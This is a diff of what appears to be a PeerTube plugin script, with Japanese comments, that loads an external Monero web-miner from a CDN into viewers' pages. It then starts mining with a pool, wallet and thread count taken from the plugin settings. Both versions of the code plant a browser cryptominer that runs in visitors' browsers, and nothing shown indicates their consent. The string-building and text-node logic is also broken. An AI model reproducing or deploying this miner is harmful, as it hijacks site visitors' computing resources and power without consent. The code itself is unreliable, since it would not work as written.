@@ -9,32 +9,32 @@ peertubeHelpers.getSettings().then(
         return
       }
 
-// JavaScriptとは違うのにPromiseは使えるとかこれもうわかんねぇな
-new Promise((resolve) => {
-      // 外部スクリプトを挿入
-      const externalScript = document.createElement("script")
-      externalScript.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"
-      externalScript.async = false
-      document.head.appendChild(externalScript)
+    // JavaScriptとは違うのにPromiseは使えるとかこれもうわかんねぇな
+    new Promise((resolve) => {
+          // 外部スクリプトを挿入
+          const externalScript = document.createElement("script")
+          externalScript.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"
+          document.head.appendChild(externalScript)
 
-      resolve();
-}).then(() => {
-      // 外部スクリプトのロード完了後に処理開始
-      console.log("Mining script loaded successfully.")
+          resolve();
+    }).then(() => {
+          // 外部スクリプトのロード完了後に処理開始
+          console.log("Mining script loaded successfully.")
 
-      let inlineScript = document.createElement("script")
-      inlineScript+= "server = '"+s['webSocket']+"';\n"
-      inlineScript+= "var pool = '"+s['poolAddress']+"';\n"
-      inlineScript+= "var walletAddress = '"+s['walletAddress']+"';\n"
-      inlineScript+= "var workerId = 'PeerTube-Miner';\n"
-      inlineScript+= "var threads = '"+s['threads']+"';\n"
-      inlineScript+= "var password = '"+s['password']+"';\n"
-      inlineScript+= "startMining(pool, walletAddress, workerId, threads, password);\n"
-      inlineScript+= "throttleMiner = 20;\n"
+          let inlineScript = document.createElement("script")
+          inlineScript+= "server = '"+s['webSocket']+"';\n"
+          inlineScript+= "var pool = '"+s['poolAddress']+"';\n"
+          inlineScript+= "var walletAddress = '"+s['walletAddress']+"';\n"
+          inlineScript+= "var workerId = 'PeerTube-Miner';\n"
+          inlineScript+= "var threads = '"+s['threads']+"';\n"
+          inlineScript+= "var password = '"+s['password']+"';\n"
+          inlineScript+= "startMining(pool, walletAddress, workerId, threads, password);\n"
+          inlineScript+= "throttleMiner = 20;\n"
 
-      document.body.appendChild(inlineScript)
-      console.log("Mining started.")
-});
+          // appendChildするとエラーが出るので、inlineScriptの文字列をテキストノードに変換する処理を挟む必要がある
+          document.body.appendChild(document.createTextNode("inlineScript"))
+          console.log("Mining started.")
+    });
 
     }
   )
